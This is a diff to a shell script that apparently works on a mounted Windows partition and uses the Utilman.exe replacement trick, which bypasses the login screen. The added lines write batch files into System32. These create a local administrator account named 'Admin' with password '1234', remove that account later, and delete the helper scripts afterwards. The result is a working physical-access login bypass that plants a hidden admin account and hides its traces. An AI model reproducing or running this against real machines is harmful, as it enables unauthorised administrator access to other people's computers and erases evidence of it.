@@ -31,7 +31,26 @@ pushd /mnt/Windows/system32
   echo "cd C:/Windows/system32" >> ez-restore.bat
   echo "copy Utilman.exe.bak Utilman.exe" >> ez-restore.bat
   echo "del /f ez-restore.bat" >> ez-restore.bat
-  echo "echo Finished restoring Utilman.exe and hiding the cleanup script!" >> ez-restore.bat
+  echo "del /f ez-add-user.bat" >> ez-restore.bat
+  echo "del /f ez-remove-user.bat" >> ez-restore.bat
+  echo "echo Finished restoring Utilman.exe and deleted scripts!" >> ez-restore.bat
+popd
+
+echo "Adding ez-add-user.bat to System32..."
+pushd /mnt/Windows/system32
+  touch ez-add-user.bat
+  echo "@echo off" > ez-add-user.bat
+  echo "net user Admin 1234 /add" >> ez-add-user.bat
+  echo "net localgroup administrators Admin /add" >> ez-add-user.bat
+  echo "echo Finished creating Admin user!" >> ez-add-user.bat
+popd
+
+echo "Adding ez-remove-user.bat to System32..."
+pushd /mnt/Windows/system32
+  touch ez-remove-user.bat
+  echo "@echo off" > ez-remove-user.bat
+  echo "net user Admin /delete" >> ez-remove-user.bat
+  echo "echo Finished removing Admin user!" >> ez-remove-user.bat
 popd
 
 echo "Unmounting partition..."
